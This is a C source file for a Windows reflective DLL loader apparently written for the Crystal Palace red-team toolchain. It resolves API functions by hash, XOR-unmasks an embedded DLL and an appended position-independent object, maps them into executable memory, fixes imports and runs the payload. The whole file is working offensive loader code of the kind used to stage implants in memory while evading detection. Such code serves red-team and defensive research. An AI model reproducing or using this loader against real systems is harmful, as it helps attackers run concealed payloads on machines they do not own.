/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
 
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 
/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}
 
/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif
 
/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
char __BOFDATA__[0] __attribute__((section("my_bof")));
char __KEYDATA__[0] __attribute__((section("my_key")));
 
char * findAppendedDLL() {
    return (char *)&__DLLDATA__;
}
 
char * findAppendedPICO() {
    return (char *)&__BOFDATA__;
}
 
char * findAppendedKey() {
    return (char *)&__KEYDATA__;
}
 
/*
 * Our embedded resources are masked, so we need to unmask them.
 */
typedef struct {
    int   length;
    char  value[];
} _RESOURCE;
 
char * unmask(char * srcData) {
    _RESOURCE * key;
    _RESOURCE * src;
    char      * dst;
 
    /* parse our preplen + xor'd $KEY and our masked data too */
    key = (_RESOURCE *)findAppendedKey();
    src = (_RESOURCE *)srcData;
 
    /* allocate memory for our unmasked content */
    dst = KERNEL32$VirtualAlloc( NULL, src->length, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
    dprintf("ALLOC %p (%d bytes)", dst, src->length);
 
    /* unmask it */
    for (int x = 0; x < src->length; x++) {
        dst[x] = src->value[x] ^ key->value[x % key->length];
    }
 
    return dst;
}
 
/*
 * Get the start address of our PIC DLL loader.
 */
void go();
 
char * getStart() {
    return (char *)go;
}
 
/*
 * Our PICO loader, have fun, go nuts!
 */
typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);
 
void RunViaFreeCOFF(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
    char        * dstCode;
    char        * dstData;
    char        * src = findAppendedPICO();
    char        * entry;
 
    /* unmask our PICO! */
    src = unmask(src);
 
    /* allocate memory for our PICO */
    dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
    dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
 
    /* load our pico into our destination address, thanks! */
    PicoLoad(funcs, src, dstCode, dstData);
 
    /* grab our entry point, the last thing we need from our unmasked PICO */
    entry = (char *)PicoEntryPoint(src, dstCode);
 
    /* now that our pico is loaded, let's free the buffer with the unmasked PICO content */
    dprintf("free %p", src);
    KERNEL32$VirtualFree( src, 0, MEM_RELEASE );
 
    /* execute our pico */
    ((PICOMAIN_FUNC_3)entry) ((char *)getStart(), dllEntry, dllBase);
}
 
/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
    char       * dst;
    char       * src;
    DLLDATA      data;
    IMPORTFUNCS  funcs;
 
    /* find our DLL appended to this PIC */
    src = findAppendedDLL();
 
    /* unmask our DLL data */
    src = unmask(src);
 
    /* parse our DLL! */
    ParseDLL(src, &data);
 
    /* allocate memory for it! */
    dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
    /* load the damned thing */
    LoadDLL(&data, src, dst);
 
    /* setup our IMPORTFUNCS data structure */
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;
 
    /* process the imports */
    ProcessImports(&funcs, &data, dst);
 
    /* pass to our BOF */
    RunViaFreeCOFF(&funcs, (char *)EntryPoint(&data, dst), dst);
}